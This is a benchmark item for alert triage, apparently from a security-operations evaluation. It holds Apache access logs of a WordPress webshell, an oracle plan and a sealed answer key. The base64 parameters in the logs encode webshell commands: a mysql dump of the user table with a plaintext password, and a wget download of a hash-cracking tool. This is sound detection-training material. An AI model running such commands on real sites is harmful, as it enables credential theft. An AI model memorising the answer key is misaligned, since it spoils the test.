@@ -1,0 +1,195 @@
+{
+  "incident_id": "ait-santos-webshell",
+  "name": "AIT-ADS santos/webshell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "santos/webshell",
+  "alert": {
+    "timestamp": "2022-01-17T11:24:14Z",
+    "host": "santos",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on santos. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-17T11:24:14Z",
+    "end": "2022-01-17T11:24:16Z",
+    "hosts": [
+      "santos"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-4a4b0487",
+        "timestamp": "2022-01-17T11:24:14Z",
+        "host": "santos",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418654.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-d84dccb9",
+        "timestamp": "2022-01-17T11:24:14Z",
+        "host": "santos",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418654.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-fae2dcf4",
+        "timestamp": "2022-01-17T11:24:16Z",
+        "host": "santos",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418656.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-4a4b0487",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:24:14Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418654.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-d84dccb9",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:24:14Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418654.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:14 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507755 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-fae2dcf4",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:24:16Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418656.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on santos. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on santos. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "santos/webshell",
+    "answer": "webshell",
+    "accept": [
+      "webshell",
+      "webshell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
